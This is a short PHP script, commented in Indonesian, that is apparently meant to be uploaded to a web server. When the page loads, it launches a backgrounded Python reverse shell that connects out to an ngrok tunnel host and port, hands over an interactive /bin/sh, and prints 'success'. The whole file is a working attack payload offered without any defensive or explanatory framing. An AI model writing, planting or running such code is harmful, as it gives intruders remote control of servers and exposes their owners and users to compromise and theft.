<?php
// Mengeksekusi perintah Python menggunakan nohup untuk menjalankan reverse shell
$command = "nohup /usr/bin/python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"0.tcp.ap.ngrok.io\",18947)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"]);' &";
exec($command);

// Menampilkan pesan sukses
echo "success";
?>
